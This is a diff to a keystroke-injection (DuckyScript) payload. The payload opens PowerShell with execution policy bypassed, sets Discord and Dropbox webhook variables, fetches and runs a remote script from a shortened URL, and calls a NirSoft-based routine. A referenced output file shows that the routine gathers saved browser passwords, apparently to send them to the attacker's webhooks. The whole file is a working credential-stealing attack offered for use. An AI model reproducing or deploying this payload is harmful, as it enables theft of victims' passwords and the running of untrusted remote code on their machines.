@@ -21,12 +21,20 @@ REM                Y8b d88P          888
 REM                 "Y88P"           888                                                           
 REM ______________________________________________________________________________________________
 REM
-REM Usage : Put your discord WEBHOOK and enjoy !
+REM Usage : Put your discord webhook into $dc | put your dopbox webhook into $db
 REM
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/evBKX | iex
+STRING powershell -NoP -Ep Bypass
+ENTER
+DELAY 1000
+STRING $dc= '' ; $db= ''
+ENTER
+STRING irm https://shorturl.at/rLQS5
+ENTER
+DELAY 1000
+STRING Get-Nirsoft
 ENTER
 DELAY 8000
 STRING wbpv28821@
@@ -41,4 +49,3 @@ STRING c:\temp\w3b_br0ws3r_p4ssw0rds.txt
 ENTER
 DELAY 1000
 ALT F4
-DELAY 800
